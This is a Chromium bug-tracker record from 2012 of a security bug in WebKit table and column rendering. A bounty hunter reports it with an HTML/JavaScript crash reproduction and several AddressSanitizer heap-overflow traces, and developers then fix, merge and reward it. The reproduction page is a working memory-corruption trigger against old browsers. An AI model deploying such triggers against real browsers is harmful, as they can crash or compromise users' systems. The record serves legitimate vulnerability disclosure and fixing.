# Bad casts due to issues in splitAnonymousBlocksAroundChild

| Field | Value |
|-------|-------|
| **Issue ID** | [40053489](https://issues.chromium.org/issues/40053489) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-02-09 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

READ of size 1 at 0x7fffece4b5c0 thread T0  

#0 0x55555aa7faf8 in WebCore::RenderTableSection::setNeedsCellRecalc() ???:0

I think I have 4 or 5 of these stacks. maybe they are all the same bug.

**VERSION**  

Chrome Version: stable, beta, dev

Chromium 19.0.1036.0 (Developer Build 121128)  

OS Linux  

WebKit 535.20 (@107140)  

JavaScript V8 3.9.4

Operating System: 64bit linux  

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1 {
-webkit-column-count: 2;
content: counter(c);
}
#el1::after {
display: table-row;
content: '';
}
#el3 {
-webkit-column-span: all;
}
</style>
<script>
function crash(){
el0 = document.createElement('div')
document.body.appendChild(el0)
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el1.appendChild(document.createElement('thead'))
el3 = document.createElement('div')
el3.setAttribute('id', 'el3')
el1.appendChild(el3)
el4 = document.createElement('q')
el1.appendChild(el4)
el4.style.display='table-row'
setTimeout(function() {
el3.style.display='table'
document.body.focus()
document.body.style.zoom=2
}, 0)
}
window.onload=crash
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer+asan  

Crash State:

READ of size 1 at 0x7fffecc2dfc0 thread T0  

#0 0x55555ae0fa42 in WebCore::RenderTableSection::setNeedsCellRecalc() ???:0  

#1 0x55555adf533a in WebCore::RenderTableCell::willBeDestroyed() ???:0  

#2 0x55555adba252 in WebCore::RenderObject::destroy() ???:0

0x7fffecc2dfc0 is located 136 bytes to the right of 184-byte region [0x7fffecc2de80,0x7fffecc2df38)  

allocated by thread T0 here:  

#0 0x55555da19582 in malloc ??:0  

#1 0x55555abad9c6 in WebCore::RenderBlock::createAnonymousBlock(bool) const ???:0

## Attachments

- [asan-renderTable136184.txt](attachments/asan-renderTable136184.txt) (text/x-c; charset=us-ascii, 6.3 KB)
- [beta-asan-renderTable136184.txt](attachments/beta-asan-renderTable136184.txt) (text/plain; charset=us-ascii, 5.9 KB)
- [renderTable136184.html](attachments/renderTable136184.html) (text/html; charset=us-ascii, 1001 B)
- [stable-asan-renderTable136184.txt](attachments/stable-asan-renderTable136184.txt) (text/plain; charset=us-ascii, 5.9 KB)
- [136184-three.html](attachments/136184-three.html) (text/html; charset=us-ascii, 873 B)
- [136184-three.txt](attachments/136184-three.txt) (text/x-c; charset=us-ascii, 5.9 KB)
- [136184four.txt](attachments/136184four.txt) (text/x-c; charset=us-ascii, 5.2 KB)
- [136184four.html](attachments/136184four.html) (text/html; charset=us-ascii, 847 B)
- [136184five.txt](attachments/136184five.txt) (text/x-c; charset=us-ascii, 7.1 KB)
- [136184five.html](attachments/136184five.html) (text/html; charset=us-ascii, 923 B)

## Timeline

### mi...@gmail.com (2012-02-09)

here's a different stack

==27297== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffecc2ddc0 at pc 0x55555ae10066 bp 0x7fffffff4130 sp 0x7fffffff4128
READ of size 1 at 0x7fffecc2ddc0 thread T0
    #0 0x55555ae10066 in WebCore::RenderTableSection::removeChild(WebCore::RenderObject*) ???:0
    #1 0x55555adba0bd in WebCore::RenderObject::willBeDestroyed() ???:0

0x7fffecc2ddc0 is located 136 bytes to the right of 184-byte region [0x7fffecc2dc80,0x7fffecc2dd38)
allocated by thread T0 here:
    #0 0x55555da19582 in malloc ??:0
    #1 0x55555abad9c6 in WebCore::RenderBlock::createAnonymousBlock(bool) const ???:0
    #2 0x55555abac947 in WebCore::RenderBlock::splitAnonymousBlocksAroundChild(WebCore::RenderObject*) ???:0




### mi...@gmail.com (2012-02-09)

and this...

READ of size 1 at 0x7fffecc9e3c0 thread T0
    #0 0x55555ae0e804 in WebCore::RenderTableSection::willBeDestroyed() ???:0
    #1 0x55555adba252 in WebCore::RenderObject::destroy() ???:0

0x7fffecc9e3c0 is located 136 bytes to the right of 184-byte region [0x7fffecc9e280,0x7fffecc9e338)
allocated by thread T0 here:
    #0 0x55555da19582 in malloc ??:0
    #1 0x55555abad9c6 in WebCore::RenderBlock::createAnonymousBlock(bool) const ???:0
    #2 0x55555abac947 in WebCore::RenderBlock::splitAnonymousBlocksAroundChild(WebCore::RenderObject*) ???:0




### mi...@gmail.com (2012-02-09)

this is the last one:

==4573== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffecc9dbc0 at pc 0x55555adf72ff bp 0x7fffffff9630 sp 0x7fffffff9628
READ of size 1 at 0x7fffecc9dbc0 thread T0
    #0 0x55555adf72ff in WebCore::RenderTableCell::clippedOverflowRectForRepaint(WebCore::RenderBoxModelObject*) const ???:0
    #1 0x55555adaf90b in WebCore::RenderObject::repaint(bool) ???:0


0x7fffecc9dbc0 is located 136 bytes to the right of 184-byte region [0x7fffecc9da80,0x7fffecc9db38)
allocated by thread T0 here:
    #0 0x55555da19582 in malloc ??:0
    #1 0x55555abac553 in WebCore::RenderBlock::createAnonymousColumnsBlock() const ???:0
    #2 0x55555abaea68 in WebCore::RenderBlock::splitFlow(WebCore::RenderObject*, WebCore::RenderBlock*, WebCore::RenderObject*, 



### ts...@chromium.org (2012-02-09)

18.0.1025.7/linux/debug, 17.0.963.51/linux/debug hit this assert:

ASSERTION FAILED: !object || object->isRenderBlock()
third_party/WebKit/Source/WebCore/rendering/RenderBlock.h(1087) : WebCore::RenderBlock* WebCore::toRenderBlock(WebCore::RenderObject*)

### in...@chromium.org (2012-02-09)

[Empty comment from Monorail migration]

### ts...@chromium.org (2012-02-09)

Upstreamed as https://bugs.webkit.org/show_bug.cgi?id=78269

### in...@chromium.org (2012-02-09)

just afyi, c#3 test case is different from rest and dup 113431. it is being fixed by https://crbug.com/chromium/113258

### in...@chromium.org (2012-02-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-14)

SecImpacts Stable is m17

### sc...@gmail.com (2012-02-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-16)

looking.

### ke...@chromium.org (2012-02-17)

http://trac.webkit.org/changeset/108127

### in...@chromium.org (2012-02-22)

DONT merge this until http://code.google.com/p/chromium/issues/detail?id=115003 is fixed. Check out c#18 and c#19 in https://bugs.webkit.org/show_bug.cgi?id=79043.

### ke...@chromium.org (2012-02-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-23)

make sure to merge this http://trac.webkit.org/changeset/108606 alongwith http://trac.webkit.org/changeset/108127. It prevents regressions in run-in crashes in 115003 and fixes their renderings which is more important to prevent future bugs. Traditionally run-ins and list-items have been pretty naughty to cause security problems.

### in...@chromium.org (2012-02-24)

confirming that r108606 fixes the run-in issues and all crashes - https://cluster-fuzz.appspot.com/?search=122724:122726#testcases

### sc...@gmail.com (2012-03-01)

M17: http://trac.webkit.org/changeset/109404, http://trac.webkit.org/changeset/109407
M18: http://trac.webkit.org/changeset/109408, http://trac.webkit.org/changeset/109413

### sc...@gmail.com (2012-03-03)

$1000 per bad cast issue -- we decided these do indeed constitute multiple issues so brace for more rewards :D

$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/113439?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/113431, crbug.com/chromium/113908]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053489)*
